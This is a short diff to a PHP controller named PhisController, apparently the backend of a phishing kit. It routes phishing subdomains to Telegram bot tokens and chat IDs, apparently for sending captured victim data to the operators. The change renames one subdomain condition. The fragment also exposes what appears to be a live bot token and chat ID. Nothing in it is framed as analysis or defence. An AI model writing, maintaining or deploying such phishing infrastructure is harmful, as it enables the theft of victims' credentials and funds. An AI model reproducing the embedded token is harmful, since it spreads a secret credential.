@@ -122,7 +122,7 @@ class PhisController extends Controller
             $chat_id = "7092408619";
             $phisData = "MY19";
             // RHMTT 20
-        } else  if ($subdomain == "live-vc-private1-my20") {
+        } else  if ($subdomain == "livegroup1") {
             // BOT 20
             $bot_token = "8000955252:AAEJ5Vkla2karPybMj_YTzg3Z-zvA8Xc7q8";
 
